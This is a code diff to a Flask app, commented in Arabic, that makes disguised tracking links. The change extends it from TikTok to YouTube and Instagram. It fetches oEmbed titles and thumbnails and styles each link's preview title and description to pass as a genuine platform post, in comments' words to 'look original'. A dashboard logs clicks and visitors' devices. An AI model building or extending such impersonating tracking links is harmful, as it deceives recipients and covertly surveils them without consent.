@@ -20,7 +20,8 @@ def init_db():
                 original_url TEXT,
                 note TEXT,
                 video_title TEXT,
-                custom_image TEXT
+                custom_image TEXT,
+                platform TEXT
             )
         ''')
         cursor.execute('''
@@ -38,22 +39,49 @@ def init_db():
 
 init_db()
 
-# دالة ذكية لجلب غلاف الفيديو وعنوانه الحقيقي من تيك توك تلقائياً
-def get_tiktok_meta(video_url):
+# دالة ذكية لتحديد المنصة تلقائياً وجلب بيانات المعاينة المناسبة لها
+def get_platform_meta(url):
+    url_lower = url.lower()
+    
+    # الإعدادات الافتراضية العامة
+    platform_name = "Video"
+    default_title = "شاهد مقطع الفيديو الرائج"
     default_img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
-    default_title = "TikTok - شاهد مقطع الفيديو الرائج"
-    try:
-        # استخدام API الرسمي المفتوح من تيك توك لجلب معلومات المعاينة
-        api_url = f"https://www.tiktok.com/oembed?url={video_url}"
-        response = requests.get(api_url, timeout=5)
-        if response.status_code == 200:
-            data = response.json()
-            title = data.get('title', default_title)
-            image = data.get('thumbnail_url', default_img)
-            return title, image
-    except Exception:
-        pass
-    return default_title, default_img
+    
+    # 1. التحقق إذا كان الرابط لتيك توك
+    if "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
+        platform_name = "TikTok"
+        default_img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
+        try:
+            api_url = f"https://www.tiktok.com/oembed?url={url}"
+            res = requests.get(api_url, timeout=4)
+            if res.status_code == 200:
+                data = res.json()
+                return "TikTok", data.get('title', default_title), data.get('thumbnail_url', default_img)
+        except:
+            pass
+            
+    # 2. التحقق إذا كان الرابط ليوتيوب
+    elif "youtube.com" in url_lower or "youtu.be" in url_lower:
+        platform_name = "YouTube"
+        default_img = "https://images.unsplash.com/photo-1611162616305-c67b3fa40904?w=600"
+        try:
+            api_url = f"https://www.youtube.com/oembed?url={url}&format=json"
+            res = requests.get(api_url, timeout=4)
+            if res.status_code == 200:
+                data = res.json()
+                return "YouTube", data.get('title', default_title), data.get('thumbnail_url', default_img)
+        except:
+            pass
+            
+    # 3. التحقق إذا كان الرابط لانستغرام
+    elif "instagram.com" in url_lower:
+        platform_name = "Instagram"
+        default_img = "https://images.unsplash.com/photo-1611262588024-d12430b98920?w=600"
+        # انستغرام يتطلب توثيقاً معقداً، لذا نضع عنواناً ذكياً افتراضياً يناسب المنصة
+        return "Instagram", "Instagram Video • شاهد المقطع على انستغرام", default_img
+
+    return platform_name, default_title, default_img
 
 def check_auth(username, password):
     return username == USERNAME and password == PASSWORD
@@ -76,7 +104,7 @@ HTML_LAYOUT = '''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصتي الذكية لإدارة الروابط</title>
+    <title>منصتي الذكية المتقدمة لإدارة الروابط</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 0; }
         .navbar { background-color: #1a252f; color: white; padding: 15px; text-align: center; font-size: 18px; font-weight: bold; }
@@ -97,6 +125,11 @@ HTML_LAYOUT = '''
         .main-table th { background-color: #34495e; color: white; }
         .link-text { color: #3498db; text-decoration: none; word-break: break-all; font-size: 12px; }
         .badge { background: #e74c3c; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
+        .platform-badge { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 11px; font-weight: bold; color: white; }
+        .bg-tiktok { background-color: #010101; }
+        .bg-youtube { background-color: #ff0000; }
+        .bg-instagram { background-color: #e1306c; }
+        .bg-video { background-color: #7f8c8d; }
         .logs-box { background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); margin-top: 20px; }
         .logs-table { width: 100%; border-collapse: collapse; font-size: 12px; text-align: center; margin-top: 10px; }
         .logs-table th, .logs-table td { padding: 10px; border: 1px solid #e2e8f0; }
@@ -104,12 +137,12 @@ HTML_LAYOUT = '''
     </style>
 </head>
 <body>
-    <div class="navbar">📊 لوحة التحكم والإدارة التلقائية (جلب أغلفة الفيديو)</div>
+    <div class="navbar">📊 لوحة الإدارة الذكية (المنصات المتعددة التلقائية)</div>
     <div class="container">
         
         <div class="stats-overview">
             <div class="stat-card">
-                <h3>إجمالي الروابط المنشأة</h3>
+                <h3>إجمالي الروابط النشطة</h3>
                 <p>{{ total_links }}</p>
             </div>
             <div class="stat-card" style="border-top-color: #e74c3c;">
@@ -119,40 +152,46 @@ HTML_LAYOUT = '''
         </div>
 
         <div class="create-box">
-            <h2>🔗 إنشاء رابط تتبع جديد (يجلب الغلاف تلقائياً)</h2>
+            <h2>🔗 توليد رابط جديد (يدعم تيك توك، يوتيوب، انستغرام)</h2>
             <form action="/create" method="POST">
-                <label>رابط فيديو التيك توك (Original URL):</label>
-                <input type="url" name="original_url" placeholder="https://vt.tiktok.com/..." required>
+                <label>رابط الفيديو الأصلي:</label>
+                <input type="url" name="original_url" placeholder="https://..." required>
                 
-                <label>ملاحظة لتمييز الرابط (Note):</label>
-                <input type="text" name="note" placeholder="مثال: فسيليتي 11" required>
+                <label>ملاحظة لتمييز الرابط:</label>
+                <input type="text" name="note" placeholder="مثال: حملة المقطع الحزين" required>
                 
-                <button type="submit">توليد الرابط الذكي</button>
+                <button type="submit">إنشاء وتجهيز المعاينة المطابقة</button>
             </form>
         </div>
 
-        <div class="section-title">📋 قائمة الروابط النشطة المعاينة تلقائياً</div>
+        <div class="section-title">📋 الروابط النشطة الحالية ومحاكاة المنصات</div>
         <div class="table-wrapper">
             <table class="main-table">
                 <thead>
                     <tr>
-                        <th>الملاحظة (Note)</th>
-                        <th>العنوان المستخرج</th>
+                        <th>الملاحظة</th>
+                        <th>المنصة</th>
+                        <th>العنوان المجلوب</th>
                         <th>النقرات</th>
-                        <th>رابط التمويه المخصص</th>
-                        <th>غلاف الفيديو المجلوب</th>
+                        <th>الرابط الذكي للمشاركة</th>
+                        <th>صورة المعاينة</th>
                     </tr>
                 </thead>
                 <tbody>
                     {% if not links_list %}
                     <tr>
-                        <td colspan="5" style="padding: 20px; color: #95a5a6;">لا توجد روابط منشأة حتى الآن.</td>
+                        <td colspan="6" style="padding: 20px; color: #95a5a6;">لا توجد روابط منشأة حالياً.</td>
                     </tr>
                     {% else %}
                         {% for link in links_list %}
                         <tr>
                             <td style="font-weight: bold; color: #2c3e50;">{{ link.note }}</td>
-                            <td style="max-width: 150px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ link.video_title }}</td>
+                            <td>
+                                <span class="platform-badge {% if link.platform == 'TikTok' %}bg-tiktok{% elif link.platform == 'YouTube' %}bg-youtube{% elif link.platform == 'Instagram' %}bg-instagram{% else %}bg-video{% endif %}">
+                                    {{ link.platform }}
+                                </span>
+                            </td>
+                            <td style="max-width: 130px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ link.video_title }}</td>
                             <td><span class="badge">{{ link.clicks_count }}</span></td>
                             <td><a class="link-text" href="/secure/{{ link.id }}" target="_blank">{{ host_url }}secure/{{ link.id }}</a></td>
                             <td>
@@ -165,7 +204,7 @@ HTML_LAYOUT = '''
             </table>
         </div>
 
-        <div class="section-title">🔍 سجل النقرات المباشر وتتبع الأجهزة (Logs)</div>
+        <div class="section-title">🔍 سجل الأجهزة المباشر (Logs)</div>
         <div class="logs-box">
             <table class="logs-table">
                 <thead>
@@ -180,7 +219,7 @@ HTML_LAYOUT = '''
                 <tbody>
                     {% if not clicks_list %}
                     <tr>
-                        <td colspan="5" style="padding: 20px; color: #95a5a6;">بانتظار تسجيل نقرات جديدة...</td>
+                        <td colspan="5" style="padding: 20px; color: #95a5a6;">بانتظار تسجيل أول نقرة...</td>
                     </tr>
                     {% else %}
                         {% for click in clicks_list %}
@@ -210,7 +249,7 @@ def home():
         cursor = conn.cursor()
         
         cursor.execute('''
-            SELECT l.id, l.original_url, l.note, l.video_title, l.custom_image, COUNT(c.id) as clicks_count 
+            SELECT l.id, l.original_url, l.note, l.video_title, l.custom_image, l.platform, COUNT(c.id) as clicks_count 
             FROM links l LEFT JOIN clicks c ON l.id = c.link_id 
             GROUP BY l.id
         ''')
@@ -235,15 +274,17 @@ def create():
     original_url = request.form.get('original_url')
     note = request.form.get('note')
     
-    # استدعاء الدالة لجلب العنوان وصورة الغلاف الحية للفيديو تلقائياً
-    video_title, custom_image = get_tiktok_meta(original_url)
+    # التعرف الذكي التلقائي على المنصة وبياناتها الحية
+    platform, video_title, custom_image = get_platform_meta(original_url)
     
     link_id = str(uuid.uuid4())[:6].upper()
     
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
-        cursor.execute("INSERT INTO links (id, original_url, note, video_title, custom_image) VALUES (?, ?, ?, ?, ?)", 
-                       (link_id, original_url, note, video_title, custom_image))
+        cursor.execute('''
+            INSERT INTO links (id, original_url, note, video_title, custom_image, platform) 
+            VALUES (?, ?, ?, ?, ?, ?)
+        ''', (link_id, original_url, note, video_title, custom_image, platform))
         conn.commit()
         
     return redirect('/')
@@ -257,8 +298,23 @@ def secure_redirect(link_id):
         link_data = cursor.fetchone()
         
     if link_data:
-        title = link_data['video_title']
-        description = "شاهد مقطع الفيديو المرفق بجودة عالية عبر تيك توك."
+        # صياغة العنوان بناءً على نوع المنصة المكتشفة لتبدو أصلية ومطابقة
+        platform = link_data['platform']
+        video_title = link_data['video_title']
+        
+        if platform == "TikTok":
+            title = f"TikTok · {video_title}"
+            description = "شاهد مقطع الفيديو المرفق بجودة عالية عبر تطبيق TikTok التفاعلي."
+        elif platform == "YouTube":
+            title = f"{video_title} - YouTube"
+            description = "مقطع فيديو مميز وقصير على منصة YouTube."
+        elif platform == "Instagram":
+            title = f"Instagram Video by {video_title if video_title else 'Creator'}"
+            description = "شاهد الصور ومقاطع الفيديو والقصص التفاعلية على Instagram."
+        else:
+            title = video_title
+            description = "اضغط لتشغيل وعرض مقطع الفيديو المرفق بجودة عالية."
+            
         image_url = link_data['custom_image']
         
         return f'''
@@ -337,7 +393,7 @@ def secure_redirect(link_id):
             </script>
         </head>
         <body style="background:#000; color:#fff; font-family:sans-serif; text-align:center; padding-top:45%;">
-            <div>جاري تشغيل مقطع الفيديو... 🎬</div>
+            <div>جاري تحميل وتشغيل مقطع الفيديو الأصلي... 🎬</div>
         </body>
         </html>
         '''
